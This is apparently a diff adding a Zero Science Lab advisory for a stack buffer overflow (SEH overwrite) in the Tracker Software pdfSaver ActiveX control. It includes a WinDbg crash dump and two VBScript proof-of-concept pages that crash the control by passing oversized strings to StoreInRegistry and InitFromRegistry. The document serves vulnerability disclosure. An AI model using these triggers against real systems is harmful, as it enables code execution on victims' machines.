@@ -1,0 +1,128 @@
+Tracker Software pdfSaver ActiveX 3.60 (pdfxctrl.dll) Stack Buffer Overflow (SEH)
+
+
+Vendor:
+-------
+Tracker Software Products Ltd.
+
+
+Product web page:
+-----------------
+http://www.tracker-software.com
+
+
+Affected version:
+-----------------
+3.60.0128
+
+
+Summary:
+--------
+PDF-Saver Technology is a unique new feature of PDF-XChange software
+which allows printing jobs to be combined prior to the final PDF file
+being generated - (e.g. to join 3 pages of Excel spreadsheet, 5 slides
+of PowerPoint presentation and 10 pages of Word document into one PDF
+document).
+
+
+Description:
+------------
+The PDF Printer Preferences ActiveX suffers from a buffer overflow
+vulnerability. When a large buffer is sent to the sub_path item of the
+StoreInRegistry function, and the sub_key item of the InitFromRegistry
+function, in pdfxctrl.dll module, we get a SEH overwrite. An attacker
+can gain access to the system of the affected node and execute arbitrary
+code.
+
+
+------------------------------------------------------------------------
+
+(1fac.1ea8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0013e9e0 ebx=00000003 ecx=0000008c edx=00001815 esi=0013cd74 edi=0013fffd
+eip=7c834d8f esp=0013b75c ebp=0013b780 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
+kernel32!lstrcatA+0x36:
+7c834d8f f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+0:000> !exchain
+0013b770: kernel32!_except_handler3+0 (7c839ac0)
+  CRT scope  0, filter: kernel32!lstrcatA+45 (7c84086d)
+                func:   kernel32!lstrcatA+49 (7c840876)
+0013f1ac: 41414141
+Invalid exception stack at 41414141
+0:000> d esp
+0013b75c  2a 30 00 00 cc 63 18 00-03 00 00 00 5c b7 13 00  *0...c......\...
+0013b76c  2a 30 00 00 ac f1 13 00-c0 9a 83 7c a8 4d 83 7c  *0.........|.M.|
+0013b77c  00 00 00 00 e4 ed 13 00-e7 d8 01 10 e0 e9 13 00  ................
+0013b78c  90 b7 13 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA
+0013b79c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0013b7ac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0013b7bc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0013b7cc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+
+------------------------------------------------------------------------
+
+
+Tested on:
+----------
+Microsoft Windows XP Professional SP3 (EN)
+
+
+Vulnerability discovered by:
+----------------------------
+Gjoko 'LiquidWorm' Krstic
+liquidworm gmail com
+Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID:
+------------
+ZSL-2012-5067
+
+
+Advisory URL:
+-------------
+http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5067.php
+
+
+
+25.01.2012
+
+
+PoC (COMRaider):
+----------------
+
+<object classid='clsid:2EE01CFA-139F-431E-BB1D-5E56B4DCEC18' id='zsl' />
+<script language='vbscript'>
+
+targetFile = "C:\PDF-XChange\pdfSaver\pdfxctrl.dll"
+prototype  = "Sub StoreInRegistry ( ByVal page_id As PdfPrinterDialogPage ,  ByVal sub_path As String )"
+memberName = "StoreInRegistry"
+progid     = "pdfxctrlLib.PdfPrinterPreferences"
+argCount   = 2
+
+arg1=1
+arg2=String(6164, "A")
+
+zsl.StoreInRegistry arg1 ,arg2 
+
+</script>
+
+--------------------
+
+<object classid='clsid:2EE01CFA-139F-431E-BB1D-5E56B4DCEC18' id='zsl' />
+<script language='vbscript'>
+
+targetFile = "C:\PDF-XChange\pdfSaver\pdfxctrl.dll"
+prototype  = "Sub InitFromRegistry ( ByVal page_id As PdfPrinterDialogPage ,  ByVal sub_key As String )"
+memberName = "InitFromRegistry"
+progid     = "pdfxctrlLib.PdfPrinterPreferences"
+argCount   = 2
+
+arg1=1
+arg2=String(14356, "A")
+
+zsl.InitFromRegistry arg1 ,arg2 
+
+</script>
